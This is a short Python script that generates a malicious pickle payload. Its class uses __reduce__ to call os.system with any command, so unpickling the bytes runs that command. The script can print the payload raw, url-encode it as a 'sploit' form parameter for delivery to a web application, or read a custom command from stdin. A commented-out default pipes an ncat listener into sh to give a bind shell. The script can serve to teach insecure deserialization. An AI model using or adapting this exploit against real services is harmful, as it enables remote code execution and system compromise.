#!/usr/bin/env python3

from os import system
from urllib3.request import urlencode
import pickle

#COMMAND_STR = "ncat -l 31337 | sh"
COMMAND_STR = "echo 'Owned!'"

HELP_MESSAGE = """
USAGE:
    python3 ./pickle_exploit.py [ OPTIONS ]

OPTIONS:
    help        print this help message
    test        unpickle the payload (careful!)
    cmd         read stdin for a command string
    url         url-encode payload (sploit=PAYLOAD)
"""

class PickleExploitFactory:
    def __init__(self, cmd):
        self.cmd = cmd

    def __reduce__(self):
        return (system, (self.cmd,))

if __name__ == '__main__':
    from sys import argv, exit

    if "help" in argv:
        print(HELP_MESSAGE)
        exit(0) 

    cmd = COMMAND_STR

    if "cmd" in argv:
        cmd = input("Enter a command to pickle: ")

    instance = PickleExploitFactory(cmd)
    bs = pickle.dumps(instance)

    if "test" in argv:
        pickle.loads(bs)
    elif "url" in argv:
        print(urlencode({'sploit':bs})) 
    else:
        print(bs)
